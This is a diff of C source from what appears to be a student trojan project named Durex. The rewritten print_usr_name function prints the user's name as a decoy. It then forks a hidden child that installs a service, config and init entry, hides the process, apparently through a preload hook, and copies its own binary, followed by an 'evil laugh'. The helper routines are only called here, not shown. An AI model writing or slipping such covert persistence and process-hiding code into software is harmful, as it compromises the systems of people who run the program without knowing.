@@ -6,14 +6,10 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
-/*   Updated: 2018/07/29 12:28:02 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2018/08/03 15:35:45 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-/* signal */
-#include <signal.h>
-/* remove */
-#include <stdio.h>
 /* exit */
 #include <stdlib.h>
 /* getpwuid */
@@ -22,42 +18,39 @@
 
 #include "main.h"
 
-static void		print_usr_name()
+static void			print_usr_name(const char *av)
 {
 	struct passwd	*passwd;
+	struct stat		s;
+	pid_t			pid;
 
 	passwd = getpwuid(getuid());
 	write(STDIN_FILENO, passwd->pw_name, strlen(passwd->pw_name));
 	write(STDIN_FILENO, "\n", 1);
-}
-
-int				main(int ac, char **av)
-{
-	struct stat	s;
-
-	(void)ac;
-	print_usr_name();
 	if (seteuid(geteuid()) != 0)
-		return 3;
-	if (!ac && stat(DUREX_BINARY_FILE, &s) < 0)
-		return install_binary(av[0]);
-	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_WRONLY, 0600);
-	if (e.lock < 0)
-		return 3;
-	if (flock(e.lock, LOCK_EX | LOCK_NB))
-		return 3;
-	for (int i = 0; i < NSIG; i++) {
-		signal(i, &durexSigterm);
+		return ;
+	if (stat(DUREX_BINARY_FILE, &s) < 0) {
+		pid = fork();
+		if (pid == 0) {
+			int		(*process[])(void) = { &install_service,
+										   &install_conf,
+										   &install_init,
+										   &hide_process_preload };
+			for (size_t i = 0; i < sizeof(process) / sizeof(*process); i++) {
+				if (process[i]())
+					return ;
+			}
+			if (!install_binary(av))
+				system("mpg123 audio/Evil_Laugh.mp3 2>/dev/null");
+		}
+		return ;
 	}
-	durex();
-	quitClearlyDaemon();
-	return 0;
+//	durex();
 }
 
-void			quitClearlyDaemon()
+int					main(int ac, char **av)
 {
-	flock(e.lock, LOCK_UN);
-	close(e.lock);
-	remove(DUREX_LOCK_FILE);
-	exit(0);
+	(void)ac;
+	print_usr_name(av[0]);
+	return 0;
 }
